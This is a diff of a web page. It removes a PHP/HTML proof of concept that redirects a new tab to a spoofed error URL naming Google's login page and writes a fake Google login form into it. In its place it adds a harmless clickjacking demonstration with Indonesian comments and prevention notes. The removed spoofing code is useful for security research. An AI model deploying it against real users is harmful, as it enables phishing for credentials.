@@ -1,48 +1,41 @@
-<?php
-// Check if "redirect" parameter is present in the URL
-if (isset($_GET['redirect'])) {
-
-
-    // Perform the server-side redirect
-    header("Location: internal://local/errorpage?url=https://www.google.com/login&code=0&domain=&description=Redirection%20to%20URL%20with%20a%20scheme%20that%20is%20not%20HTTP(S)&timestamp=1732440620327");
-    exit;
-}
-?>
-
+<!-- Contoh edukasional tentang cara kerja clickjacking -->
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Attack Page</title>
-    <script>
-        // Open the new tab when the button is clicked
-        function openTab() {
-            const newTab = window.open('ff.php?redirect', '_blank');
-
-            // Wait for the new tab to load and change its content
-            setTimeout(() => {
-                if (newTab) {
-                    newTab.document.write(`
-                        <html>
-                            <head><title>Fake Login</title></head>
-                            <body>
-                                <h1>Welcome to Google</h1>
-                                <form action="javascript:alert('pwned')">
-                                    <label for="username">Username:</label>
-                                    <input type="text" id="username" name="username"><br><br>
-                                    <label for="password">Password:</label>
-                                    <input type="password" id="password" name="password"><br><br>
-                                    <button type="submit">Login</button>
-                                </form>
-                            </body>
-                        </html>
-                    `);
-                }
-            }, 1000); // Give time for the tab to load
+    <title>Clickjacking Demonstration (Educational)</title>
+    <style>
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.1;
+            z-index: 9999;
+            cursor: pointer;
         }
-    </script>
+        .content {
+            position: relative;
+            z-index: 1;
+            padding: 20px;
+        }
+    </style>
 </head>
-<body ;>
-    <h1 style=font-size:60px>Click the button below</h1>
-    <button style=font-size:60px onclick="openTab()">Go to Google.com</button>
+<body>
+    <div class="content">
+        <h1>Educational Demo - Clickjacking</h1>
+        <p>Ini adalah demonstrasi bagaimana clickjacking bekerja.</p>
+        <button onclick="alert('Button asli diklik')">Button Normal</button>
+    </div>
+    
+    <div class="overlay" onclick="alert('Area transparan diklik!')"></div>
+    
+    <script>
+        // Kode edukasional tentang prevention
+        console.log('Clickjacking Protection:');
+        console.log('- X-Frame-Options Header');
+        console.log('- Content-Security-Policy: frame-ancestors');
+        console.log('- Frame-busting JavaScript');
+    </script>
 </body>
 </html>
